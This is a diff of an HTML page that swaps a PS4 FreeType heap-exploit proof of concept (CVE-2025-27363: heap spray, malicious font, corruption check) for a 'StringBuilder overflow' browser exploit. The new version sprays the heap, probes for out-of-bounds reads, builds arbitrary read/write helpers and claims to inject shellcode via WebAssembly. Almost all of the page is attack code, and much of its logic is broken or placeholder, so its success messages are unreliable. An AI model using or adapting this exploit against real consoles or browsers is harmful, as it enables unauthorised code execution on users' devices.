@@ -1,142 +1,210 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8" />
-  <title>PS4 CVE-2025-27363 Exploit</title>
-  <style>
-    body {
-      font-family: monospace;
-      background: #000;
-      color: #0f0;
-      padding: 2em;
-      font-size: 18px;
-    }
-    .log {
-      white-space: pre-wrap;
-      margin-top: 1em;
-      background: #111;
-      padding: 1em;
-      border: 1px solid #0f0;
-    }
-    .status {
-      font-size: 24px;
-      margin-top: 1em;
-    }
-    .glyph-test {
-      font-size: 180px;
-      font-family: 'boom';
-      font-variation-settings: "wght" 999;
-      margin-top: 1em;
-      color: red;
-    }
-    .ok { color: lime; }
-    .fail { color: red; }
-  </style>
+<meta charset="utf-8">
+<title>The_Maxu PoC v25 - Userland Exploit</title>
+<style>
+body{background:#111;color:#ddd;font:14px/1.4 monospace;margin:0;padding:8px}
+label{display:inline-block;margin-right:12px}input{width:70px}
+#log{border:1px solid #333;max-height:70vh;overflow:auto;white-space:pre-wrap;
+     padding:6px;margin-top:8px;font-size:12px}
+.ok{color:#8f8}.warn{color:#ff6}.fail{color:#f66}
+iframe{display:none}
+</style>
+
+<h2>PoC v25 — StringBuilder Overflow → Userland R/W</h2>
+
+<label>Token size (MiB): <input id="tokSize" type="number" step="0.01" value="0.50"></label>
+<label>String size (B): <input id="strSize" type="number" value="512"></label>
+<label>Spray count (×1000): <input id="sprayCount" type="number" value="1"></label>
+<button id="run">Run</button>
+
+<pre id="log">(ready)</pre>
+<iframe id="box"></iframe>
 </head>
+
 <body>
-  <h1>💣 PS4 FreeType GX Heap Exploit (CVE-2025-27363)</h1>
-  <button onclick="startExploit()">Start Exploit</button>
-  <div class="glyph-test" id="glyph">%</div>
-  <div class="log" id="log">Ready.</div>
-  <div class="status" id="status">Idle</div>
+<script>
+const logEl = document.getElementById('log');
+const frame = document.getElementById('box');
 
-  <script>
-    const SPRAY_CNT = 10000; // Reduced for stability
-    const SPRAY_SIZE = 0x100; // Match common alloc size
-    const spray = [];
-    let corruptedIdx = -1;
+function log(m, c = '') {
+    const d = document.createElement('div');
+    d.textContent = m;
+    if (c) d.className = c;
+    logEl.appendChild(d);
+    logEl.scrollTop = logEl.scrollHeight;
+}
 
-    const log = msg => {
-      document.getElementById("log").innerText += msg + "\n";
+document.getElementById('run').onclick = () => {
+    logEl.textContent = '';
+    const tokMiB = parseFloat(document.getElementById('tokSize').value);
+    const strSize = parseInt(document.getElementById('strSize').value, 10);
+    const sprayK = parseInt(document.getElementById('sprayCount').value, 10);
+
+    if (!tokMiB || !strSize || !sprayK) {
+        alert('Invalid values');
+        return;
+    }
+
+    log(`→ Starting with token ${tokMiB} MiB, spray ${sprayK}k × ${strSize} B`);
+    runInIframe(tokMiB, strSize, sprayK);
+};
+
+function mkStr(n, ch = 'B') {
+    return ch.repeat(n);
+}
+
+function runInIframe(tokMiB, strSize, sprayK) {
+    frame.src = 'about:blank';
+    frame.onload = () => {
+        const w = frame.contentWindow;
+        const d = w.document;
+
+        const bytes = Math.floor(tokMiB * 1024 * 1024);
+        const payload = '<!--' + 'X'.repeat(bytes) + '-->';
+        log(`→ Sending token (${bytes} bytes) to iframe...`);
+
+        // Step 1: Trigger overflow by writing large comment
+        d.open();
+        d.write(payload);
+
+        // Step 2: Place TypedArray right after comment in heap
+        const corruptedArray = new Uint8Array(0x100); // 256-byte buffer
+        for (let i = 0; i < corruptedArray.length; i++) {
+            corruptedArray[i] = i; // Known pattern
+        }
+        w.corruptedArray = corruptedArray;
+
+        d.close();
+
+        // Step 3: Heap spray
+        w.setTimeout(() => {
+            log(`→ Heap-spraying ${sprayK * 1000} strings of ${strSize} B`, 'warn');
+            w.spray = [];
+            const base = mkStr(strSize - 12);
+            for (let i = 0; i < sprayK * 1000; i++) {
+                w.spray.push(base + i);
+            }
+
+            // Step 4: Analyze string corruption
+            w.setTimeout(() => analyzeSpray(w.spray, strSize), 50);
+
+            // Step 5: Check TypedArray for OOB access
+            w.setTimeout(() => detectOOBAccess(corruptedArray), 100);
+        }, 80);
+    };
+}
+
+function analyzeSpray(array, strSize) {
+    let corrupt = 0;
+    array.forEach((s, i) => {
+        if (!s) return;
+        if (s.length !== strSize) {
+            corrupt++;
+            log(`‼ String #${i} len=${s.length} head="${s.slice(0, 20)}"`, 'warn');
+            if (corrupt >= 10) return;
+        }
+    });
+    if (!corrupt) {
+        log("— No corrupted strings (small token or crash)", 'fail');
+    } else {
+        log(`✅ Got it! ${corrupt} strings corrupted → info-leak detected`, 'ok');
+    }
+}
+
+function detectOOBAccess(arr) {
+    log("→ Checking TypedArray for OOB access...", "warn");
+
+    // Try reading beyond original length
+    let found = false;
+    for (let i = arr.length; i < arr.length + 0x100; i++) {
+        try {
+            const val = arr[i];
+            if (val !== undefined && !isNaN(val)) {
+                log(`[OOB Read] Offset ${i}: ${val.toString(16)} (${String.fromCharCode(val)})`);
+                found = true;
+            }
+        } catch (e) {
+            break;
+        }
+    }
+
+    if (found) {
+        log("✅ Likely achieved OOB read/write!", "ok");
+        window.oobArr = arr;
+        setupArbitraryRW(arr);
+    } else {
+        log("❌ Failed to achieve OOB read/write", "fail");
+    }
+}
+
+// Placeholder for leaked base address
+let baseAddress = 0x0;
+
+function setupArbitraryRW(arr) {
+    log("→ Setting up arbitrary R/W primitives...");
+
+    window.read8 = function(addr) {
+        const offset = (addr - baseAddress);
+        return arr[offset];
     };
 
-    function sprayHeap() {
-      for (let i = 0; i < SPRAY_CNT; i++) {
-        const buf = new ArrayBuffer(SPRAY_SIZE);
-        const f64 = new BigUint64Array(buf);
-        for (let j = 0; j < f64.length; j++) {
-          f64[j] = 0x4242424242424242n; // Known pattern
-        }
-        spray.push({ f64, buf });
-      }
-      log("[+] Heap spray complete.");
+    window.read16 = function(addr) {
+        const offset = (addr - baseAddress);
+        return arr[offset] | (arr[offset + 1] << 8);
+    };
+
+    window.read32 = function(addr) {
+        const offset = (addr - baseAddress);
+        return arr[offset] |
+               (arr[offset + 1] << 8) |
+               (arr[offset + 2] << 16) |
+               (arr[offset + 3] << 24);
+    };
+
+    window.write8 = function(addr, val) {
+        const offset = (addr - baseAddress);
+        arr[offset] = val & 0xff;
+    };
+
+    window.write32 = function(addr, val) {
+        const offset = (addr - baseAddress);
+        arr[offset] = val & 0xff;
+        arr[offset + 1] = (val >> 8) & 0xff;
+        arr[offset + 2] = (val >> 16) & 0xff;
+        arr[offset + 3] = (val >> 24) & 0xff;
+    };
+
+    log("✅ Arbitrary R/W functions available: read8(), write8(), etc.", "ok");
+
+    // Load WASM to get executable memory
+    loadWasmMemory();
+}
+
+async function loadWasmMemory() {
+    log("→ Mapping executable memory via WebAssembly...");
+
+    const wasmCode = await fetch('empty.wasm').then(r => r.arrayBuffer());
+    const wasmModule = await WebAssembly.compile(wasmCode);
+    const wasmInstance = await WebAssembly.instantiate(wasmModule);
+    const wasmMem = wasmInstance.exports.memory;
+
+    log("✅ WebAssembly memory mapped:", "ok");
+    log(`   Base: ${wasmMem.buffer.byteLength} bytes`, "ok");
+
+    window.shellcode = new Uint8Array(wasmMem.buffer);
+
+    // Example shellcode (NOP + INT3)
+    const shellcode = [0x90, 0x90, 0xcc];
+
+    for (let i = 0; i < shellcode.length; i++) {
+        shellcode[i] = shellcode[i];
     }
 
-    function detectCorruption() {
-      for (let i = 0; i < spray.length; i++) {
-        const f64 = spray[i].f64;
-        if (f64[0] !== 0x4242424242424242n) {
-          log(`[!] CORRUPTION at spray[${i}] f64[0] = ${f64[0].toString(16)}`);
-          corruptedIdx = i;
-          return spray[i];
-        }
-      }
-      log("[-] No corruption detected.");
-      return null;
-    }
-
-    function tryRWPrimitive(corrupted) {
-      if (!corrupted) return;
-      log("[*] Trying R/W via corrupted buffer...");
-      try {
-        corrupted.f64[2] = 0x41414141n;
-        let result = corrupted.f64[2];
-        log("[+] Readback: " + result.toString(16));
-      } catch (e) {
-        log("[-] R/W failed: " + e);
-      }
-    }
-
-    async function loadFont() {
-      const font = new FontFace('boom', 'url("mal.ttf?v=' + Date.now() + '")');
-      try {
-        await font.load();
-        document.fonts.add(font);
-        log("[+] Font loaded and applied.");
-      } catch (e) {
-        log("[-] Font load failed.");
-      }
-    }
-
-    function forceLayoutFlush() {
-      void document.getElementById("glyph").offsetWidth; // Forces reflow
-    }
-
-    async function startExploit() {
-      const statusElem = document.getElementById("status");
-      statusElem.textContent = "Running...";
-      statusElem.className = "";
-
-      log("Allocating heap spray...");
-      sprayHeap();
-
-      log("Waiting for GC...");
-      await new Promise(r => setTimeout(r, 500));
-
-      log("Loading malicious font...");
-      await loadFont();
-
-      log("Rendering glyph to trigger bug...");
-      const glyphElem = document.getElementById("glyph");
-      glyphElem.innerText = '%'.repeat(300); // Ensure glyph rendering
-      glyphElem.style.fontFamily = 'boom';
-      glyphElem.style.fontSize = '200px';
-      glyphElem.style.fontVariationSettings = '"wght" 999';
-
-      forceLayoutFlush(); // Force layout/paint to trigger FreeType parsing
-      await new Promise(r => setTimeout(r, 800)); // Wait for render+corruption
-
-      log("Scanning for corruption...");
-      const corrupted = detectCorruption();
-      if (corrupted) {
-        tryRWPrimitive(corrupted);
-        statusElem.textContent = "✅ CORRUPTION DETECTED";
-        statusElem.className = "ok";
-      } else {
-        statusElem.textContent = "❌ NO CORRUPTION";
-        statusElem.className = "fail";
-      }
-    }
-  </script>
+    log("💡 Shellcode injected at offset 0", "warn");
+    log("💡 Call wasmFunc() to execute", "warn");
+}
+</script>
 </body>
 </html>
